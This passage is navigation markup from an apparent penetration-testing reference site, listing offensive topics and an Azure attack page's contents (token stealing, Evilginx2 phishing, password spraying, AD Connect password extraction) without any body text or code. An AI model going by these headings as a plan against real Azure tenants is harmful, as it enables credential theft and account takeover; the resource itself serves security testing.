        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
          Insecure Management Interface
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_21">
          <span class="md-nav__icon md-icon"></span>
          Insecure Management Interface
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
        Insecure Management Interface
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
      
      
      
        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
          Insecure Randomness
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_22">
          <span class="md-nav__icon md-icon"></span>
          Insecure Randomness
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Randomness/" class="md-nav__link">
        Insecure Randomness
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
      
      
      
        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
          Insecure Source Code Management
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_23">
          <span class="md-nav__icon md-icon"></span>
          Insecure Source Code Management
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
        Insecure Source Code Management
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
      
      
      
        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
          JSON Web Token
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_24">
          <span class="md-nav__icon md-icon"></span>
          JSON Web Token
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
        JWT - JSON Web Token
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
      
      
      
        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
          Java RMI
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_25">
          <span class="md-nav__icon md-icon"></span>
          Java RMI
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Java%20RMI/" class="md-nav__link">
        Java RMI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
      
      
      
        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
          Kubernetes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_26">
          <span class="md-nav__icon md-icon"></span>
          Kubernetes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/" class="md-nav__link">
        Kubernetes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
      
      
      
        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
          LDAP Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_27">
          <span class="md-nav__icon md-icon"></span>
          LDAP Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LDAP%20Injection/" class="md-nav__link">
        LDAP Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
      
      
      
        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
          LaTeX Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_28">
          <span class="md-nav__icon md-icon"></span>
          LaTeX Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LaTeX%20Injection/" class="md-nav__link">
        LaTex Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" checked>
      
      
      
        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
          Methodology and Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_29">
          <span class="md-nav__icon md-icon"></span>
          Methodology and Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Active%20Directory%20Attack/" class="md-nav__link">
        Active Directory Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Bind%20Shell%20Cheatsheet/" class="md-nav__link">
        Bind Shell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
        Cloud - AWS
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Cloud - Azure
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Cloud - Azure
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#azure-recon-tools" class="md-nav__link">
    Azure Recon Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authenticating-to-the-microsoft-graph-api-in-powershell" class="md-nav__link">
    Authenticating to the Microsoft Graph API in PowerShell
  </a>
  
    <nav class="md-nav" aria-label="Authenticating to the Microsoft Graph API in PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#graph-api-refresh-token" class="md-nav__link">
    Graph API Refresh Token
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#graph-api-access-token" class="md-nav__link">
    Graph API Access Token
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminology" class="md-nav__link">
    Terminology
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#training" class="md-nav__link">
    Training
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerate-valid-emails" class="md-nav__link">
    Enumerate valid emails
  </a>
  
    <nav class="md-nav" aria-label="Enumerate valid emails">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    Password spraying
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-azure-subdomains" class="md-nav__link">
    Enumerate Azure Subdomains
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-tenant-with-azure-ad-powershell" class="md-nav__link">
    Enumerate tenant with Azure AD Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-tenant-with-az-powershell" class="md-nav__link">
    Enumerate tenant with Az Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-tenant-with-az-cli" class="md-nav__link">
    Enumerate tenant with az cli
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-manually" class="md-nav__link">
    Enumerate manually
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration-methodology" class="md-nav__link">
    Enumeration methodology
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#phishing-with-evilginx2" class="md-nav__link">
    Phishing with Evilginx2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#illicit-consent-grant" class="md-nav__link">
    Illicit Consent Grant
  </a>
  
    <nav class="md-nav" aria-label="Illicit Consent Grant">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#register-application" class="md-nav__link">
    Register Application
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#configure-application" class="md-nav__link">
    Configure Application
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setup-365-stealer-deprecated" class="md-nav__link">
    Setup 365-Stealer (Deprecated)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setup-vajra" class="md-nav__link">
    Setup Vajra
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#device-code-phish" class="md-nav__link">
    Device Code Phish
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#token-from-managed-identity" class="md-nav__link">
    Token from Managed Identity
  </a>
  
    <nav class="md-nav" aria-label="Token from Managed Identity">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#azure-api-via-powershell" class="md-nav__link">
    Azure API via Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#azure-api-via-python-version" class="md-nav__link">
    Azure API via Python Version
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-tokens" class="md-nav__link">
    Get Tokens
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-tokens" class="md-nav__link">
    Use Tokens
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#refresh-tokens" class="md-nav__link">
    Refresh Tokens
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stealing-tokens" class="md-nav__link">
    Stealing Tokens
  </a>
  
    <nav class="md-nav" aria-label="Stealing Tokens">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#stealing-tokens-from-az-cli" class="md-nav__link">
    Stealing tokens from az cli
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stealing-tokens-from-az-powershell" class="md-nav__link">
    Stealing tokens from az powershell
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#add-credentials-to-all-enterprise-applications" class="md-nav__link">
    Add credentials to all Enterprise Applications
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#spawn-ssh-for-azure-web-app" class="md-nav__link">
    Spawn SSH for Azure Web App
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#azure-storage-blob" class="md-nav__link">
    Azure Storage Blob
  </a>
  
    <nav class="md-nav" aria-label="Azure Storage Blob">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerate-blobs" class="md-nav__link">
    Enumerate blobs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sas-url" class="md-nav__link">
    SAS URL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-and-download-blobs" class="md-nav__link">
    List and download blobs
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#runbook-automation" class="md-nav__link">
    Runbook Automation
  </a>
  
    <nav class="md-nav" aria-label="Runbook Automation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#create-a-runbook" class="md-nav__link">
    Create a Runbook
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-via-automation-accounts" class="md-nav__link">
    Persistence via Automation accounts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#virtual-machine-runcommand" class="md-nav__link">
    Virtual Machine RunCommand
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#keyvault-secrets" class="md-nav__link">
    KeyVault Secrets
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pass-the-prt" class="md-nav__link">
    Pass The PRT
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pass-the-certificate" class="md-nav__link">
    Pass The Certificate
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#intunes-administration" class="md-nav__link">
    Intunes Administration
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dynamic-group-membership" class="md-nav__link">
    Dynamic Group Membership
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#administrative-unit" class="md-nav__link">
    Administrative Unit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#deployment-template" class="md-nav__link">
    Deployment Template
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-proxy" class="md-nav__link">
    Application Proxy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-endpoint" class="md-nav__link">
    Application Endpoint
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conditional-access" class="md-nav__link">
    Conditional Access
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#azure-ad" class="md-nav__link">
    Azure AD
  </a>
  
    <nav class="md-nav" aria-label="Azure AD">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#azure-ad-vs-active-directory" class="md-nav__link">
    Azure AD vs Active Directory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-spray" class="md-nav__link">
    Password Spray
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#convert-guid-to-sid" class="md-nav__link">
    Convert GUID to SID
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#azure-ad-connect" class="md-nav__link">
    Azure AD Connect
  </a>
  
    <nav class="md-nav" aria-label="Azure AD Connect">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#azure-ad-connect-password-extraction" class="md-nav__link">
    Azure AD Connect - Password extraction
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#azure-ad-connect-msol-accounts-password-and-dcsync" class="md-nav__link">
    Azure AD Connect - MSOL Account's password and DCSync
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#azure-ad-connect-seamless-single-sign-on-silver-ticket" class="md-nav__link">
    Azure AD Connect - Seamless Single Sign On Silver Ticket
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
        Cobalt Strike
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Docker%20Pentest/" class="md-nav__link">
        Container - Docker Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
        Container - Kubernetes Pentest
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Escape%20Breakout/" class="md-nav__link">
        Application Escape and Breakout
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Hash%20Cracking/" class="md-nav__link">
        Hash Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Evasion/" class="md-nav__link">
        Linux - Evasion
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Persistence/" class="md-nav__link">
        Linux - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
        Linux - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
        MSSQL Server
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Metasploit%20-%20Cheatsheet/" class="md-nav__link">
        Metasploit
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Methodology%20and%20enumeration/" class="md-nav__link">
        Bug Hunting Methodology and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Miscellaneous%20-%20Tricks/" class="md-nav__link">
        Miscellaneous & Tricks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Discovery/" class="md-nav__link">
        Network Discovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Network%20Pivoting%20Techniques/" class="md-nav__link">
        Network Pivoting Techniques
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Office%20-%20Attacks/" class="md-nav__link">
        Office - Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Powershell%20-%20Cheatsheet/" class="md-nav__link">
        Powershell
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Source%20Code%20Management/" class="md-nav__link">
        Source Code Management
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Subdomains%20Enumeration/" class="md-nav__link">
        Subdomains Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
        AMSI Bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20DPAPI/" class="md-nav__link">
        Windows - DPAPI
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Defenses/" class="md-nav__link">
        Windows - Defenses
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
        Windows - Download and execute methods
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Mimikatz/" class="md-nav__link">
        Windows - Mimikatz
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Persistence/" class="md-nav__link">
        Windows - Persistence
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
        Windows - Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Windows%20-%20Using%20credentials/" class="md-nav__link">
        Windows - Using credentials
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
      
      
      
        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
          NoSQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_30">
          <span class="md-nav__icon md-icon"></span>
          NoSQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../NoSQL%20Injection/" class="md-nav__link">
        NoSQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
      
      
      
        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
          OAuth Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_31">
          <span class="md-nav__icon md-icon"></span>
          OAuth Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../OAuth%20Misconfiguration/" class="md-nav__link">
        OAuth Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
      
      
      
        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
          Open Redirect
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_32">
          <span class="md-nav__icon md-icon"></span>
          Open Redirect
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Open%20Redirect/" class="md-nav__link">
        Open URL Redirection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
      
      
      
        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
          Race Condition
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_33">
          <span class="md-nav__icon md-icon"></span>
          Race Condition
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Race%20Condition/" class="md-nav__link">
        Race Condition
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
      
      
      
        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
          Request Smuggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_34">
          <span class="md-nav__icon md-icon"></span>
          Request Smuggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Request%20Smuggling/" class="md-nav__link">
        Request Smuggling
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
      
      
      
        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
          SAML Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_35">
          <span class="md-nav__icon md-icon"></span>
          SAML Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SAML%20Injection/" class="md-nav__link">
        SAML Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
      
      
      
        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
          SQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_36">
          <span class="md-nav__icon md-icon"></span>
          SQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/" class="md-nav__link">
        SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
        Google BigQuery SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
        Cassandra Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
        DB2 Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
        Hibernate Query Language Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
        MSSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
        MYSQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/OracleSQL%20Injection/" class="md-nav__link">
        Oracle SQL Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/PostgreSQL%20Injection/" class="md-nav__link">
        PostgreSQL injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../SQL%20Injection/SQLite%20Injection/" class="md-nav__link">
        SQLite Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
      
      
      
        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
          Server Side Request Forgery
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_37">
          <span class="md-nav__icon md-icon"></span>
          Server Side Request Forgery
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Request%20Forgery/" class="md-nav__link">
        Server-Side Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
      
      
      
        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
          Server Side Template Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_38">
          <span class="md-nav__icon md-icon"></span>
          Server Side Template Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Server%20Side%20Template%20Injection/" class="md-nav__link">
        Server Side Template Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
      
      
      
